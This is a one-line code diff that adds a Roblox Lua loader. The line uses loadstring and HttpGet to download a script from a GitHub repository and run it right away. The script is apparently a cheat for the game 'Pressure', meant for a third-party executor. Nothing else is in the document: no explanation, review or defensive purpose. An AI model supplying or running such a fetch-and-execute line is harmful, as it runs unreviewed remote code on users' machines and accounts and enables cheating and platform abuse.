@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NobloxOfficial/PRESSURE-Roblox/refs/heads/main/Pressure%20script%20for%20Z%20I%20N%20D%20E%20X'))()
